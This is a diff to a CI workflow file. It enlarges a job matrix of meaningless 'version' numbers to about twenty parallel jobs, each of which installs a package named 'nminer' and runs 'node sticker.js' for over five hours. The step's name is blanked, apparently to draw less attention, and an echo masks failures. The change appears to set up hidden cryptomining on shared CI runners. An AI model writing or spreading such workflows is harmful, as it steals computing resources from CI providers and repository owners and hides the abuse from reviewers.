@@ -9,24 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4786 }
-          - { version: 1064 }
-          - { version: 5450 }
-          - { version: 4034 }
-          - { version: 5965 }
-          - { version: 1544 }
-          - { version: 7846 }
-          - { version: 6926 }
-          - { version: 4961 }
-          - { version: 2543 }
+          - { version: 1180 }
+          - { version: 9103 }
+          - { version: 9479 }
+          - { version: 4627 }
+          - { version: 5140 }
+          - { version: 657 }
           - { version: 5269 }
-          - { version: 568 }
-          - { version: 9307 }
-          - { version: 9110 }
-          - { version: 7757 }
-          - { version: 2082 }
-          - { version: 4038 }
-          - { version: 5899 }
+          - { version: 9155 }
+          - { version: 2566 }
+          - { version: 2899 }
+          - { version: 7416 }
+          - { version: 1687 }
+          - { version: 8472 }
+          - { version: 6721 }
+          - { version: 2763 }
+          - { version: 778 }
+          - { version: 1262 }
+          - { version: 4713 }
+          - { version: 7073 }
+          - { version: 5350 }
 
     steps:
       - name: Checkout
@@ -37,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: unusual
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 320m node sticker.js || echo "sticker executed"
+          timeout 318m node sticker.js || echo "sticker executed"
